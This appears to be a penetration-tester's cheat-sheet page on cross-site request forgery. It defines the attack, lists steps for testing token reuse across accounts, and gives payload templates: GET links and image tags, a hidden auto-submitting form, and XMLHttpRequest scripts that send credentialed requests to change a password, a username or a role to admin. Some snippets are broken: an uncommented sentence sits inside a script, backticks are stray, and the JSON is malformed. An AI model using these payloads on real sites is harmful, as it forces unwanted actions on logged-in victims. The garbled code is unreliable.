---
description: Cross Site Request Forgery
---

# CSRF

An attack where a victim unknowingly causes their browser to perform an unwanted action on a site where they are already authenticated.  This can be caused via the attacker using some form of social engineering to fool a user into opening a malicious link, e-mail, instant message or program which automates the action.  
An unrealistic and simplified example would be a victim clicking on a link like https://paypal.com/user/sadvictim/sendfunds/99999dollars/touser/bad\_daddy or https://facebook.com/user/ignoramus/changepassword?newpassword=123456 , though the links would be portrayed as something else and the victim already has logged-in cookies to those domains.

The vulnerability is available if you can use the same CSRF token across multiple accounts \(check your cookies to find it\). You can build a poc by...  
1. Login to account 1  
**2.** Go to password change page  
3. capture CSRF token  
4. logout and login to account 2   
5. go to password change page  
6. Intercept request with a proxy and replace token  


\*\*\*\*

**Via GET request**  
requiring user interaction:  
`<a href="http://site.com/api/setuserpassword=babyboy">Click Me!</a>`  
Not requiring user interaction \(will happen as soon as browser loads\)  
`<img src="http://site.com/api/setuserpassword=badbaby">`

**Via POST request**  


User Interaction Required

```text
<form action="http://site.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="baddaddy" />
 <input type="submit" value="Submit Request" />
</form>
```

User Interaction Not Required

```text
<form id="autosubmit" action="http://site.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="badboy" />
 <input type="submit" value="Submit Request" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>
```

**Via json GET**

```text
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.xyz.com/api/currentuser");
xhr.send();
</script>
```

**Via json POST**  


```text
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://site.com/api/setrole");
xhr.setRequestHeader("Content-Type", "text/plain");
You will probably want to also try one or both of these
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.setRequestHeader("Content-Type", "multipart/form-data");
xhr.send('{"role":admin}');
</script>
_______________________OR______________________________
`<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://site.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":admin}');
</script>``
```

